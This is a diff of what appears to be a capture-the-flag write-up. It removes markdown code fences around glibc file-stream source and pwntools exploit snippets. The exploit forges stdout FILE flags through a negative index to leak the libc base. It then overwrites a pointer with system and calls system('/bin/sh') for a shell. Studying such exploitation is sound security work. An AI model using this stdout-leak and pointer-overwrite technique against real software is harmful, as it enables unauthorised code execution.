@@ -169,11 +169,6 @@ if ( to_do )
     
 return(n - to_do);
 }
-```
-
-
-
-```
 int _IO_new_file_overflow( FILE *f, int ch )
 {
 if ( f->_flags & _IO_NO_WRITES ) /* SET ERROR */
@@ -238,21 +233,11 @@ if ( _IO_do_write( f, f->_IO_write_base,
     
 return( (unsignedchar) ch);
 }
-```
-
-
-
-```
 int _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
 {
   return (to_do == 0
    || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
 }
-```
-
-
-
-```
 static size_t new_do_write( FILE *fp, const char *data, size_t to_do )
 {
 size_t count;
@@ -281,11 +266,6 @@ if ( fp->_cur_column && count )
        ? fp->_IO_buf_base : fp->_IO_buf_end);
 return(count);
 }
-```
-
-
-
-```
 # stdout leak libc
 p.sendlineafter(b'5. Exitn', b'4')
 p.sendlineafter(b'index:n', b'-8')
@@ -297,11 +277,6 @@ p.sendafter(b'Enter a new username:n', p32(0xfbad1880) + p32(0) + p64(0) * 3 +
 libc_base = u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1ec980
 libc.address = libc_base
 success("libc_base = " + hex(libc_base))
-```
-
-
-
-```
 # 创建一个chunk存储/bin/sh
 p.sendlineafter(b'5. Exit', b'1')
 p.sendafter(b'Enter your username:', b'/bin/sh')
@@ -319,11 +294,6 @@ p.sendafter(b'Enter a new username:', p64(libc.sym['system']))
 # system("/bin/sh")
 p.sendlineafter(b'5. Exit', b'2')
 p.sendlineafter(b'index:', b'0')
-```
-
-
-
-```
 from pwn import *
 
 elf = ELF("./user")
